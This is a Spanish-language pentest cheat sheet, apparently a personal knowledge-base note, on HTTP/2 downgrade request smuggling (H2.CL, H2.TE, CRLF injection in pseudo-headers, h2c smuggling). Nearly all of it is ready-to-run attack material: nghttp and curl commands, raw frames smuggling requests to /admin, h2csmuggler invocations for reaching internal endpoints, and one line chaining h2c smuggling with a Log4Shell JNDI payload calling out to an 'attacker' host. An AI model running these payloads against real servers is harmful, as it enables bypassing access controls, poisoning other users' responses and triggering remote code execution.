---
aliases:
  - H2.CL
  - H2.TE
  - HTTP/2 Smuggling
  - H2 Desync
  - h2cSmuggling
tags:
  - type/technique
  - vuln/http-smuggling
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[HTTP Request Smuggling]]'
---
# HTTP Request Smuggling - HTTP/2 Downgrade

***

## H2.CL (HTTP/2 → HTTP/1.1 + Content-Length)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater → Inspector → "Request smuggling" → seleccionar H2.CL → enviar request con `content-length: 0` + body con smuggled | Auto-armar H2.CL frame | Burp Pro. |
| `nghttp -v --header="content-length: 0" -d body.txt https://target/` con body conteniendo smuggled request | Manual nghttp | Sin Burp. |
| `python3 -c "import h2.connection,h2.config; ..." (script H2 raw)` | Custom H2 frame con CL=0 + body con request smuggled | Custom tooling. |
| H2 frame con `content-length: 0\r\n\r\nGPOST /admin HTTP/1.1\r\nHost: target\r\n\r\n` body | Smuggle GET /admin → próximo cliente recibe response | Standard H2.CL exploit. |
| Burp HTTP Request Smuggler → "Detect" en H2 endpoint → selecciona H2.CL | Auto-detect vulnerable | Pre-attack. |
| Validation: re-fetch normal post-smuggle → ver si próxima response refleja smuggled | Self-poison test | Confirm. |
^hrs-h2-cl

### Stylesheet H2.CL

```
HTTP/2 request frame:
:method: POST
:path: /
:scheme: https
:authority: target.com
content-length: 0

[BODY BYTES]
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=evilbody
```

Frontend reescribe a H1 con `Content-Length: 0`. Backend H1 procesa request principal con body vacío. Bytes posteriores quedan en queue → próxima request del back es la smuggled `GPOST /admin`.

___

## H2.TE (HTTP/2 → HTTP/1.1 + Transfer-Encoding)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nghttp -v --header="transfer-encoding: chunked" -d body.txt https://target/` con body con smuggled chunk + terminator | H2.TE smuggle — front no rejecta TE en H2 | RFC 7540 prohíbe pero parsers laxos. |
| Burp → Repeater → Inspector → H2.TE mode | Auto-arm H2.TE smuggle | Burp Pro. |
| H2 frame con `transfer-encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED REQ` | Smuggle estándar TE | Backend H1 lee chunked. |
| `nghttp -v --header="content-length: 999" --header="transfer-encoding: chunked" -d body.txt https://target/` | CL+TE en H2 — RFC dice ignore CL si TE presente | Combine vector. |
| `nghttp -v --header="Transfer-Encoding: chunked"` (case mixed) | Case differential bypass | Some parsers case-sensitive. |
| Burp HTTP Request Smuggler → H2.TE detect | Auto-detect | Pre-attack. |
^hrs-h2-te

___

## H2 Request Line Injection (CRLF en pseudo-headers)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Repeater → Inspector → H2 → editar `:path` con `\r\n\r\n` literal | Inject CRLF en pseudo-header | Burp permite raw H2 edits. |
| `nghttp -v --header=":path: /foo HTTP/1.1\r\nHost: target\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n" https://target/` | Path injection en pseudo-header → frontend traduce + back ve 2 requests | Frontend no sanitiza CRLF. |
| `--header=":authority: target\r\nFoo: x"` | Authority injection | Frontend manda como `Host:`, CRLF separa. |
| `--header=":path: /foo%0d%0aHost:%20target%0d%0a%0d%0aGET%20/admin"` | URL-encoded CRLF bypass | Frontend decode antes de validate. |
| Burp HTTP Request Smuggler → H2 inspector con request line injection mode | Tool-driven | Comprehensive auto. |
| Validation: server logs muestran `GPOST` o paths raros | Indicator residual | Forensic confirm. |
^hrs-h2-request-line

### Stylesheet request line injection

```
HTTP/2 frame:
:method: GET
:path: /foo HTTP/1.1\r\nHost: target.com\r\nX: x\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
:scheme: https
:authority: target.com
```

Frontend traduce a H1:
```
GET /foo HTTP/1.1
Host: target.com
X: x

GET /admin HTTP/1.1
Host: target.com

```

Backend recibe 2 requests — segunda es la smuggleada.

___

## H2 Pseudo-Header Injection / h2c Smuggling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -v -H "Connection: Upgrade, HTTP2-Settings" -H "HTTP2-Settings: AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA" -H "Upgrade: h2c" https://target/` | h2c upgrade probe — si responde 101 Switching Protocols → vulnerable | Frontend ingenuo permite upgrade. |
| `git clone https://github.com/BishopFox/h2csmuggler && python3 h2csmuggler/h2csmuggler.py -x https://target/ -X /admin` | Auto-explota h2c smuggling | Tool dedicado. |
| `python3 h2csmuggler.py -x https://target/ -X /api/internal/users` | Acceder endpoint interno via h2c túnel | Bypass front controls. |
| `python3 h2csmuggler.py -x https://target/ -X "/api/x?cmd=$(jndi:ldap://attacker)"` | Combine h2c bypass + Log4Shell | Compound exploit. |
| `nghttp -v --header=":authority: target1.com,target2.com" https://target/` | Authority injection multi-host | Internal vhost reach. |
| `nghttp -v --header=":scheme: javascript" https://target/` | Scheme confusion injection | Backend laxo. |
^hrs-h2-pseudo-header

### h2cSmuggler workflow

```bash
# 1. Detectar h2c upgrade
curl -v -H "Connection: Upgrade, HTTP2-Settings" \
     -H "HTTP2-Settings: AAEAAEAAAAIAAAABAAMAAABkAAQBAAAAAAUAAEAA" \
     -H "Upgrade: h2c" \
     https://target/
# Si responde 101 Switching Protocols → vulnerable

# 2. Explotar
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
python3 h2csmuggler.py -x https://target/ -X /admin

# 3. Endpoints internos
python3 h2csmuggler.py -x https://target/ -X /api/internal/users
```

***
